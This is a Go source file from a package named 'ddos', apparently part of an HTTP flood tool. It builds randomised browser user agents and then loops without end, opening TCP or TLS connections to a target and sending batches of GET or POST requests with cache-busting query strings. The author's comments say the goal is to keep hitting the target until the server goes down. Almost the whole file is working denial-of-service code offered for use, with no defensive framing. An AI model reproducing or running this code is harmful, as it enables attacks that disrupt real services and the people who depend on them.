/*
Coded by LeeOn123
Please fking code ur script by ur self, kid.

I changed the random integers range to the max of int32.
Now 386 systems should work well.

Looks like most people want to hit the url but not the host/ip.
As a result, here you are.
*/
package ddos

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"strconv"
	"time"
)


func init() {
	rand.Seed(time.Now().UnixNano()) //fixed seed problem
}
func getuseragent() string {

	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2)-1)]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3)-1)]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4)-1)]
	}
	browser := choice5[rand.Intn(len(choice5)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func contain(char string, x string) int { //simple compare
	times := 0
	ans := 0
	for i := 0; i < len(char); i++ {
		if char[times] == x[0] {
			ans = 1
		}
		times++
	}
	return ans
}

func flood() {
	addr := host + ":" + port
	header := ""
	if mode == "get" {
		header += " HTTP/1.1\r\nHost: "
		header += addr + "\r\n"
		if os.Args[5] == "nil" {
			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
			header += "User-Agent: " + getuseragent() + "\r\n"
			header += acceptall[rand.Intn(len(acceptall))]
			header += referers[rand.Intn(len(referers))] + "\r\n"
		} else {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()
		}
	} else if mode == "post" {
		data := ""
		if os.Args[5] != "nil" {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()

		} else {
			data = "f"
		}
		header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
	}
	var s net.Conn
	var err error
	<-start //received signal
	for {
		if port == "443" {
			cfg := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         host, //simple fix
			}
			s, err = tls.Dial("tcp", addr, cfg)
		} else {
			s, err = net.Dial("tcp", addr)
		}
		if err != nil {
			fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
		} else {
			for i := 0; i < 100; i++ {
				request := ""
				if os.Args[3] == "get" {
					request += "GET " + page + key
					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
				}
				request += header + "\r\n"
				s.Write([]byte(request))
			}
			s.Close()
		}
		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
	}
}
